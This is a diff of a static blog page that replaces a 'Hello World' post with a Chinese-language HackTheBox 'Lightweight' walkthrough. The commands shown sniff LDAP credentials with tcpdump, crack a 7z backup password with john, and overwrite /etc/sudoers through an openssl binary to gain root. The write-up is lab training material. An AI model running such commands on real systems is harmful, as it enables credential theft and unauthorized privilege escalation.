@@ -9,7 +9,7 @@
     
     <title>
         
-            Hello World |
+            Lightweight - HackTheBox |
         
         Td
     </title>
@@ -171,7 +171,7 @@
         <div class="article-content-container border-box">
 
             <div class="article-title">
-                <span class="title-hover-animation">Hello World</span>
+                <span class="title-hover-animation">Lightweight - HackTheBox</span>
             </div>
 
             
@@ -197,13 +197,13 @@
         
             <span class="meta-info-item article-create-date">
                 <i class="icon fa-solid fa-calendar-check"></i>&nbsp;
-                <span class="pc">2022-08-29 11:31:12</span>
-                <span class="mobile">2022-08-29 11:31</span>
+                <span class="pc">2023-05-20 17:43:34</span>
+                <span class="mobile">2023-05-20 17:43</span>
             </span>
 
             <span class="meta-info-item article-update-date">
                 <i class="icon fa-solid fa-file-pen"></i>&nbsp;
-                <span class="pc">2022-08-29 11:31:12</span>
+                <span class="pc">2023-05-20 17:43:34</span>
             </span>
         
 
@@ -219,6 +219,9 @@
             <span class="article-tag meta-info-item border-box">
                 <i class="icon fas fa-tags"></i>&nbsp;
                 <ul>
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/Hack-The-Box/">Hack-The-Box</a></li>
+                        
                     
                 </ul>
             </span>
@@ -244,17 +247,206 @@
                 <p><img  
                      lazyload
                      alt="image"
-                     data-src="https://cdn.staticaly.com/gh/Tddddddddd/picx-images-hosting@master/image/image.webp"
+                     data-src="https://cdn.staticaly.com/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Lightweight/image.282cq33ul5es.webp"
                      
                 ></p>
-<p>很久没有见过这个标题了，之前也或多或少尝试过几次搭建blog，但是都没有坚持到现在，<del>主要是因为懒</del></p>
-<p>前几次都是用的腾讯云、阿里云等云平台购买的服务器进行搭建，后面由于忘记续费，<del>没钱</del>，所导致以前的数据也都不存在了，这次又一时兴起，想整一个blog出来，想到购买合适的服务器，以及购买域名，和日常维护等等等等一堆乱七八糟的事情</p>
-<p>所以就考虑搭建一个静态的，维护起来也省事，这次所选用的是Hexo+Keep+GitHub的组合，省去了购买服务器与域名的钱，以及无需操心遭受攻击，<del>除非能把Github打穿</del></p>
+<p>nmap扫描</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.staticaly.com/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Lightweight/image.5p7h49dxv5c0.webp"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.staticaly.com/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Lightweight/image.2atsvj1wbg2s.webp"
+                     
+                ></p>
+<p>先看80</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.staticaly.com/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Lightweight/image.4vhnwog1qio0.webp"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.staticaly.com/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Lightweight/image.5hrjz7yb9000.webp"
+                     
+                ></p>
+<p>这边是说添加了一个账号到ssh，然后账号密码都是访问的IP地址</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.staticaly.com/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Lightweight/image.6xja4zjeh300.webp"
+                     
+                ></p>
+<p>直接提权？</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.staticaly.com/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Lightweight/image.68fharo61m80.webp"
+                     
+                ></p>
+<p>有一个tcpdump可以以管理员身份运行，但不能获取权限</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.staticaly.com/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Lightweight/image.2p9sgi4qj3y0.webp"
+                     
+                ></p>
+<p>这边还开放了389端口</p>
+<p><code>ldapsearch -x -H ldap://10.10.10.119 -b &quot;DC=lightweight,DC=htb&quot; -s sub</code></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.staticaly.com/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Lightweight/image.158ya75wesjg.webp"
+                     
+                ></p>
+<p>貌似可以获得密码，用tcpdump来监听一下ldap协议的流量</p>
+<p><code>tcpdump -i any -X port ldap</code></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.staticaly.com/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Lightweight/image.3kx0ood12440.webp"
+                     
+                ></p>
+<p>貌似这就是密码，切换账户</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.staticaly.com/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Lightweight/image.44jskl4sdps0.webp"
+                     
+                ></p>
+<p>继续</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.staticaly.com/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Lightweight/image.36pauvyep4e0.webp"
+                     
+                ></p>
+<p>在家目录下发现一个backup的压缩包，下到本地看看</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.staticaly.com/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Lightweight/image.5jrxc3c7vtw0.webp"
+                     
+                ></p>
+<p>报错，把压缩包进行个编码在下载</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.staticaly.com/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Lightweight/image.6t3kmmemh380.webp"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.staticaly.com/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Lightweight/image.6en3bln78bs0.webp"
+                     
+                ></p>
+<p>解压</p>
+<p><code>7z e backup.7z</code></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.staticaly.com/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Lightweight/image.1mqmnzlcclq8.webp"
+                     
+                ></p>
+<p>要密码，爆破一下</p>
+<p><code>apt-get install liblzma-dev</code></p>
+<p><code>cpan -i Compress::Raw::Lzma</code></p>
+<p><code>https://github.com/philsmd/7z2hashcat</code></p>
+<p><code>perl 7z2john.pl backup.7z &gt;hash</code></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.staticaly.com/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Lightweight/image.45u2kzbpzgq0.webp"
+                     
+                ></p>
+<p>在用john爆破</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.staticaly.com/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Lightweight/image.5oas9yfxqv40.webp"
+                     
+                ></p>
+<p>解压出了一堆php文件</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.staticaly.com/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Lightweight/image.22sm2vbf9mo0.webp"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.staticaly.com/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Lightweight/image.40wu45hc7ss0.webp"
+                     
+                ></p>
+<p>另一个用户的密码</p>
+<p>在家目录下发现一个openssl</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.staticaly.com/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Lightweight/image.4vc1uy26q1a0.webp"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.staticaly.com/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Lightweight/image.zwjxj34a0b4.webp"
+                     
+                ></p>
+<p>可以用openssl写入一个sudo -l权限给一个用户</p>
+<p><code>echo -ne &quot;root\tALL=(ALL) ALL\n\&quot;10.10.14.12\&quot;\tALL=(ALL) ALL\n%sudo\tALL=(ALL) ALL\n&quot; |base64 &gt; ca</code></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.staticaly.com/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Lightweight/image.796cedmfuzw0.webp"
+                     
+                ></p>
+<p><code>/home/ldapuser1/openssl base64 -d -in ca -out /etc/sudoers</code></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.staticaly.com/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Lightweight/image.1u622zcdxwps.webp"
+                     
+                ></p>
+<p>在切换回10.10.14.12用户</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.staticaly.com/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Lightweight/image.3m3r34u5lkq0.webp"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.staticaly.com/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Lightweight/image.4tv9wc1xtts0.webp"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.staticaly.com/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Lightweight/image.2fyf7251p1s0.webp"
+                     
+                ></p>
 
             </div>
 
             
 
+            
+                <ul class="post-tags-box">
+                    
+                        <li class="tag-item">
+                            <a href="/tags/Hack-The-Box/"><i class="icon fas fa-hashtag"></i>Hack-The-Box</a>&nbsp;
+                        </li>
+                    
+                </ul>
             
 
             
@@ -263,18 +455,33 @@
                         <div class="article-prev">
                             <a class="prev"
                                rel="prev"
-                               href="/post/eb5b8f948eee/"
+                               href="/post/427daae154a1/"
                             >
                             <span class="left arrow-icon flex-center">
                               <i class="fas fa-chevron-left"></i>
                             </span>
                                 <span class="title flex-center">
-                                <span class="post-nav-title-item text-ellipsis">cisp-pte</span>
+                                <span class="post-nav-title-item text-ellipsis">Bitlab - HackTheBox</span>
                                 <span class="post-nav-item">上一篇</span>
                             </span>
                             </a>
                         </div>
                     
+                    
+                        <div class="article-next">
+                            <a class="next"
+                               rel="next"
+                               href="/post/51fbd6a339b6/"
+                            >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item text-ellipsis">Netmon - HackTheBox</span>
+                                <span class="post-nav-item">下一篇</span>
+                            </span>
+                                <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                            </a>
+                        </div>
                     
                 </div>
             
